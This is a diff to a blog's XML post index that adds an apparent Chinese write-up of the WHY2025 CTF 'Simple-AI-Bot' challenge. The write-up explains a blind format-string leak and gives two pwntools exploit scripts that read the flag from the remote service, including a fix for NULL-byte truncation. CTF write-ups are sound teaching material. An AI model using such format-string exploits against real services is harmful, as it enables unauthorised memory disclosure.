@@ -4,6 +4,48 @@
   
   
   <entry>
+    <title>&#92;[第五空间2019 决赛&#92;]PWN5</title>
+    <link href="/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/"/>
+    <url>/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>pwn刷题记录</category>
+      
+      <category>格式化字符串</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>2025.08.09-Simple-AI-Bot</title>
+    <link href="/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/"/>
+    <url>/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/</url>
+    
+    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>2025年8月9日的WHY2025 CTF赛题，链接在这<a href="https://ctf.why2025.org/challenges">WHY2025 CTF: Simple-AI-Bot</a><br></p><span id="more"></span><p>个人觉得很难的一道题目，需要盲打，一开始完全没思路……</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先拿到题目，发现没有任何附件，需要盲打，这里就卡住了，后来队友提示需要利用格式化字符串漏洞+有一个flag交互选项才知道怎么做<br><br>具体来说，首先监听给的端口，如图，注意到（其实就是瞎猜，我愿称我哥们为拉马努金……）输入包含flag的字符串就可以让机器人返回flag的地址：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/flag-prompt.png"><br>接下来既然我的拉马努金队友说了是格式化字符串，那就用%p测试一下，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/fmt-test.png"><br>可以看到会输出一些0x巴拉巴拉的地址，说明存在格式化字符串漏洞<br><br>经过上述分（瞎）析（猜），可以确定漏洞点即 <em><strong>泄露flag存储位置+格式化字符串输出</strong></em> 这一思路<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定输入的内容在printf时是位于第几个参数，如图，通过tag%p%p%p……%p来确定：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/offset.png"><br>然后肉眼数一下有几个0x，发现到输入的1序列（即0x31）有6个0x，因此输入最终会被放在第6个参数<br><br>然后写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(p64(flagAddr)+<span class="hljs-string">b&quot;%6$s&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure><p>但是，这个exp并不能打通，原因是没有注意到NULL字节会截断printf的格式化字符串，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/NULL-Byte-Error.png"><br>可以看到泄露的地址只有6个字节，p64打包时会引入0字节，导致后面的%6$s不会被printf识别，因此要把格式字符放在前面，不过这样的话偏移要+1变成7，如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(<span class="hljs-string">b&quot;%7$s&quot;</span>+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(flagAddr))<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>pwn刷题记录</category>
+      
+      <category>格式化字符串</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>mprotect技巧</title>
     <link href="/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/"/>
     <url>/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/</url>
